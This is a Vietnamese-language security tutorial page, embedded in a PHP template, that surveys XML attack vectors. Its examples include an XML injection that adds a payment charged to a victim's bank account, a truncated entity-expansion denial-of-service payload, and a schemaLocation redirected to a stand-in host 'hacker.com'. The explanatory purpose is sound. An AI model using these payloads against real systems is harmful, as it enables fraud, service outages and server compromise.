<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-xxe/xxe" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    XML Attack Vector
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                    <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Cac-muc-tieu-tan-cong"><a href="#Cac-muc-tieu-tan-cong" class="headerlink" title="Các mục tiêu tấn công"></a>Các mục tiêu tấn công</h1>
                <p>Cơ chế hoạt động của XML như sau:<br><strong>Application =&gt; XML Generator =&gt; HTTP Client =&gt; Web Server =&gt; XML Parser =&gt; Application</strong></p>
                <h2 id="Cac-muc-tieu-co-the-tan-cong"><a href="#Cac-muc-tieu-co-the-tan-cong" class="headerlink" title="Các mục tiêu có thể tấn công:"></a>Các mục tiêu có thể tấn công:</h2>
                <ul>
                    <li>Network service</li>
                    <li>XML generator: Quá trình tạo XML từ dữ liệu.</li>
                    <li>XML parser: Quá trình chuyển từ XML sang data.</li>
                    <li>Application code: Logic trong code dẫn đến bị kẻ tấn công lợi dụng.</li>
                </ul>
                <h1 id="XML-Generator-Attacks"><a href="#XML-Generator-Attacks" class="headerlink" title="XML Generator Attacks"></a>XML Generator Attacks</h1>
                <p>XML Generators là cơ chế xây dựng XML documents từ dữ liệu. Tuỳ thuộc vào cơ chế logic của mỗi ứng dụng, có thể cho phép ta chèn, thêm vào một phần của XML documents.</p>
                <h2 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Một ngân hàng lưu thông tin các account user vào file xml, có cấu trúc như sau:<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">batchjob</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">payment</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">account</span>&gt;</span>taikhoancuahacker<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">amount</span>&gt;</span>100.00<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">matkhau</span>&gt;</span>123<span class="tag">&lt;/<span class="name">matkhau</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">payment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">batchjob</span>&gt;</span></span><br><span class="line">``` </span><br><span class="line">Ngân hàng không biết thông tin của người dùng như tên, nên họ cho người dùng nhập vào rồi chèn vào thẻ name thông tin đó.</span><br><span class="line">Hacker cung cấp **tên** là code xml như sau:</span><br><span class="line">``` xml</span><br><span class="line">Hacker<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">payment</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">payment</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">account</span>&gt;</span>victim_account<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">amount</span>&gt;</span>100.00<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">matkhau</span>&gt;</span>123<span class="tag">&lt;/<span class="name">matkhau</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Victim<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">payment</span>&gt;</span><span class="tag">&lt;<span class="name">batchjob</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Khi đó, XML Generator chèn đoạn code đó vào xml rồi gửi lên server xử lý.</p>
                <h2 id="Lam-sai-hoat-dong-cua-server-gt-Hacked"><a href="#Lam-sai-hoat-dong-cua-server-gt-Hacked" class="headerlink" title="Làm sai hoạt động của server => Hacked."></a>Làm sai hoạt động của server =&gt; Hacked.</h2>
                <h1 id="XML-Parser-Attacks"><a href="#XML-Parser-Attacks" class="headerlink" title="XML Parser Attacks"></a>XML Parser Attacks</h1>
                <p>Do công nghệ sử dụng XML có rất nhiều lợi ích, giải quyết các vấn đề như:</p>
                <ul>
                    <li>Không yêu cầu sự serialization của giao thức.</li>
                    <li>Cách tiếp cận giữa các loại dữ liệu khác nhau là giống nhau.</li>
                    <li>Dễ dàng chuyển từ XML document sang các loại đối tượng khác.</li>
                </ul>
                <p><strong>XML Parser</strong> là cơ chế chuyển đổi từ XML documents sang các dạng dữ liệu khác để tiếp tục sử dụng xử lý.</p>
                <h2 id="Cac-van-de-cua-XML-Parser-de-ke-tan-cong-khai-thac"><a href="#Cac-van-de-cua-XML-Parser-de-ke-tan-cong-khai-thac" class="headerlink" title="Các vấn đề của XML Parser để kẻ tấn công khai thác"></a>Các vấn đề của XML Parser để kẻ tấn công khai thác</h2>
                <h3 id="XML-Parser-Verbose-Error-Message"><a href="#XML-Parser-Verbose-Error-Message" class="headerlink" title="XML Parser: Verbose Error Message"></a>XML Parser: Verbose Error Message</h3>
                <p>XML Parsers thường xuyên trả về rất nhiều thông tin khi mà xảy ra lỗi trong quá trình chuyển đổi:</p>
                <ul>
                    <li>Schema definitions và nơi xảy ra lỗi.</li>
                    <li>Java Stack Traces hoặc phần của nó.</li>
                </ul>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">XMLParserError: Error on line 3: cvc-complextype.2.4.b:</span><br><span class="line">The content of element 'header' is not</span><br><span class="line">complete. It must match '(((((((("":senderid),</span><br><span class="line">"":reference)), ("":receipientid){0-1}),...'.</span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Hacker sẽ lợi dụng để lấy thêm thông tin của server.</p>
                <h3 id="XML-Parser-Overlog-XML-Documents"><a href="#XML-Parser-Overlog-XML-Documents" class="headerlink" title="XML Parser: Overlog XML Documents"></a>XML Parser: Overlog XML Documents</h3>
                <p>Các XML documents quá dài vẫn được xử lý, hacker có thể lợi dụng để thực hiện cuộc tấn công DOS.<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding =<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sample [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY x100 “A very CPU consuming task :)"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY x99 "&amp;x100;&amp;x100;"&gt;</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">&lt;!ENTITY x1 "&amp;x2;&amp;x2;"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h3 id="XML-Parser-XXE"><a href="#XML-Parser-XXE" class="headerlink" title="XML Parser: XXE"></a>XML Parser: XXE</h3>
                <p><strong>XXE</strong> là XML External Entity Attacks.</p>
                <ul>
                    <li>Entities là một tính năng được khai báo bởi DTDs. Còn <strong>External entities</strong> thường được sử dụng để inlcude documents khác.</li>
                </ul>
                <h3 id="XML-Parser-External-XML-Schema"><a href="#XML-Parser-External-XML-Schema" class="headerlink" title="XML Parser: External XML Schema"></a>XML Parser: External XML Schema</h3>
                <p>XML Schemas được lưu trong file xml, nếu để kẻ tấn công can thiệp, có thể thay đổi được schemaLocation sang địa chỉ khác, làm cho quá trình chạy của server thành sai. Từ đó, kẻ tấn công có thể khai thác.<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap..."</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance“</span></span></span><br><span class="line">xsi:schemaLocation="http://schemas.xmlsoap.org/so.../ &lt;dấu cách&gt;http://www.hacker.com/hack.txt"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Bài sau mình sẽ đi sâu vào kỹ thuật XXE, bài này chủ yếu giới thiệu các vector tấn công của XML cho các bạn hiểu thêm.</p>
                <h1 id="Tham-khao"><a href="#Tham-khao" class="headerlink" title="Tham khảo"></a>Tham khảo</h1>
                <ul>
                    <li><strong>ROOT-ME DOCUMENT</strong>: <a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XML%20External%20Entity%20Attacks%20(XXE)%20-%20owasp.pdf" target="_blank" rel="noopener">http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XML%20External%20Entity%20Attacks%20(XXE)%20-%20owasp.pdf</a></li>
                    <li><strong>OWASP DOCUMENT</strong>:<a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20What%20You%20Didn't%20Know%20About%20XML%20External%20Entities%20Attacks.pdf" target="_blank" rel="noopener">http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20What%20You%20Didn't%20Know%20About%20XML%20External%20Entities%20Attacks.pdf</a></li>
                </ul>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>